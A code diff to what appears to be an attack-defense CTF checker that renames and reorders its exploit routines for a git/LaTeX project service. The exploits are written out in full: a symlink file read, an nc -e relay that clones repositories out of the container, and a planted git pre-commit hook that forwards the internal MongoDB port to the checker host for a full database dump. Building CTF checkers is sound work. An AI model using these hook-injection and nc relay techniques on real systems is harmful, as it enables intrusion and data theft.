@@ -78,7 +78,7 @@ async def getflag_zero(task: GetflagCheckerTaskMessage, client: AsyncClient, db:
 
 
 @checker.exploit(0)
-async def exploit_zero(task: ExploitCheckerTaskMessage, client: AsyncClient, searcher: FlagSearcher, logger: LoggerAdapter) -> str:
+async def exploit_read_symlink(task: ExploitCheckerTaskMessage, client: AsyncClient, searcher: FlagSearcher, logger: LoggerAdapter) -> str:
     attack_info = json.loads(task.attack_info)
     if 'project_id' not in attack_info:
         raise MumbleException("Missing project_id in attack_info")
@@ -111,8 +111,8 @@ async def exploit_zero(task: ExploitCheckerTaskMessage, client: AsyncClient, sea
     if flag := searcher.search_flag(file):
         return flag
 
-@checker.exploit(1)
-async def exploit_one(task: ExploitCheckerTaskMessage, client: AsyncClient, searcher: FlagSearcher, logger: LoggerAdapter) -> str:
+@checker.exploit(2)
+async def exploit_git_clone_from_container(task: ExploitCheckerTaskMessage, client: AsyncClient, searcher: FlagSearcher, logger: LoggerAdapter) -> str:
     (_, _, _, id) = await create_user_and_project(client, None, logger)
 
     attack_info = json.loads(task.attack_info)
@@ -122,10 +122,10 @@ async def exploit_one(task: ExploitCheckerTaskMessage, client: AsyncClient, sear
     f_id = attack_info['project_id']
 
     # gizmo to forward a connection
-    forward = subprocess.Popen(["ncat", "-lvnp", checker_forward_port, '-ke', '/usr/bin/ncat -lvnp 1234'], stdout=open(os.devnull, 'w'), stderr=subprocess.STDOUT)
+    forward = subprocess.Popen(["ncat", "-lvnp", checker_forward_port_1, '-ke', '/usr/bin/ncat -lvnp 1234'], stdout=open(os.devnull, 'w'), stderr=subprocess.STDOUT)
     
     clone = subprocess.Popen(["bash", '-c', f"while true; do git clone http://127.0.0.1:1234/{f_id} /tmp/{f_id} &> /dev/null && break; done"])
-    commands = f"while true; do nc {checker_ip} {checker_forward_port} -e \"/usr/bin/nc nginx-git 80\"; done"
+    commands = f"while true; do nc {checker_ip} {checker_forward_port_1} -e \"/usr/bin/nc nginx-git 80\"; done"
     
 
     file_content = """\\documentclass[12pt]{minimal}
@@ -177,67 +177,62 @@ async def getflag_one(task: GetflagCheckerTaskMessage, client: AsyncClient, db: 
     
     raise MumbleException("Flag not found.")
 
-@checker.exploit(2)
+@checker.exploit(1)
 async def exploit_git_hooks(task: ExploitCheckerTaskMessage, client: AsyncClient, searcher: FlagSearcher, logger: LoggerAdapter) -> str:
-    for _ in range(2): # my code has a bug somewhere so lets try it twice :D
-        attack_info = json.loads(task.attack_info)
-        if 'username' not in attack_info:
-            raise MumbleException("Missing username in attack_info")
+    attack_info = json.loads(task.attack_info)
+    if 'username' not in attack_info:
+        raise MumbleException("Missing username in attack_info")
         
-        # create a project
-        (username, password, _, id) = await create_user_and_project(client, None, logger)
-        path_in_container = "/data"
-        # clone it locally
-        path = await clone_project(username, password, id, task.address, logger)
-        # setup a symlink to the git folder
-        os_succ(os.system(f"ln -s ./.git {path}/git"))
-        # setup a folder for a symlink to the pre-commit hook
-        os_succ(os.system(f"mkdir -p {path}/hooks"))
-        os_succ(os.system(f"ln -s ../.git/hooks/pre-commit.sample {path}/hooks/pre-commit"))
+    # create a project
+    (username, password, _, id) = await create_user_and_project(client, None, logger)
+    path_in_container = "/data"
+    # clone it locally
+    path = await clone_project(username, password, id, task.address, logger)
+    # setup a symlink to the git folder
+    os_succ(os.system(f"ln -s ./.git {path}/git"))
+    # setup a folder for a symlink to the pre-commit hook
+    os_succ(os.system(f"mkdir -p {path}/hooks"))
+    os_succ(os.system(f"ln -s ../.git/hooks/pre-commit.sample {path}/hooks/pre-commit"))
 
-        await git_config_commit_and_push(path, username, "Exploit!", logger)
+    await git_config_commit_and_push(path, username, "Exploit!", logger)
 
-        await cleanup_clone(path)
+    await cleanup_clone(path)
 
-        # let the server pull the changes
-        await pull(client, id, logger)
+    # let the server pull the changes
+    await pull(client, id, logger)
 
-        # change the hook path used
-        config_str = await download_file(client, id, "git/config", logger)
-        lines = config_str.split("\n")
-        lines.insert(1, f"\thooksPath = {path_in_container}/hooks")
-        config_str = "\n".join(lines)
-        await upload_file(client, id, "git/config", config_str, logger)
+    # change the hook path used
+    config_str = await download_file(client, id, "git/config", logger)
+    lines = config_str.split("\n")
+    lines.insert(1, f"\thooksPath = {path_in_container}/hooks")
+    config_str = "\n".join(lines)
+    await upload_file(client, id, "git/config", config_str, logger)
 
-        forward_code = f"while true; do nc {checker_ip} {checker_forward_port} -e /usr/bin/nc db 27017 && break; done"
-        await upload_file(client, id, "hooks/pre-commit", f"#!/bin/sh\n{forward_code}", logger)
+    forward_code = f"while true; do nc {checker_ip} {checker_forward_port_2} -e /usr/bin/nc db 27017 && break; done"
+    await upload_file(client, id, "hooks/pre-commit", f"#!/bin/sh\n{forward_code}", logger)
 
-        await upload_file(client, id, "someChangedFile", "this file is new!", logger)
+    await upload_file(client, id, "someChangedFile", "this file is new!", logger)
 
-        dump_command = "mongo --host 127.0.0.1 --port 1234 --username=root --password=password --eval 'DBQuery.shellBatchSize=1000000000; db.projects.find({}, {name:1})' &>> /tmp/dump.json"
+    dump_command = "mongo --host 127.0.0.1 --port 1234 --username=root --password=password --eval 'DBQuery.shellBatchSize=1000000000; db.projects.find({}, {name:1})' &>> /tmp/dump.json"
 
-        forward = subprocess.Popen(["ncat", "-lvnp", checker_forward_port, '-ke', '/usr/bin/ncat -lvnp 1234'], stdout=open(os.devnull, 'w'), stderr=subprocess.STDOUT)
-        dump = subprocess.Popen(["bash", '-c', f"while true; do {dump_command} && break; done"])
+    forward = subprocess.Popen(["ncat", "-lvnp", checker_forward_port_2, '-ke', '/usr/bin/ncat -lvnp 1234'], stdout=open(os.devnull, 'w'), stderr=subprocess.STDOUT)
+    dump = subprocess.Popen(["bash", '-c', f"while true; do {dump_command} && break; done"])
 
-        await commit(client, id, "Exploit!", logger, True) # trigger the pre-commit hook
+    await commit(client, id, "Exploit!", logger, True) # trigger the pre-commit hook
 
-        forward.kill()
-        dump.kill()
+    forward.kill()
+    dump.kill()
 
-        if not os.path.exists("/tmp/dump.json"):
-            raise MumbleException("Dump file not found")
+    if not os.path.exists("/tmp/dump.json"):
+        raise MumbleException("Dump file not found")
 
-        with open("/tmp/dump.json", "r") as f:
-            output = f.read()
+    with open("/tmp/dump.json", "r") as f:
+        output = f.read()
 
-        os_succ(os.system("rm -rf /tmp/dump.json"))
+    os_succ(os.system("rm -rf /tmp/dump.json"))
 
-        if flag := searcher.search_flag(output):
-            return flag
-        
-        await asyncio.sleep(1)
-
-    raise MumbleException(output)
+    if flag := searcher.search_flag(output):
+        return flag
 
 @checker.putnoise(0)
 async def putnoise_file_content(task: PutnoiseCheckerTaskMessage, client: AsyncClient, db: ChainDB, logger: LoggerAdapter):
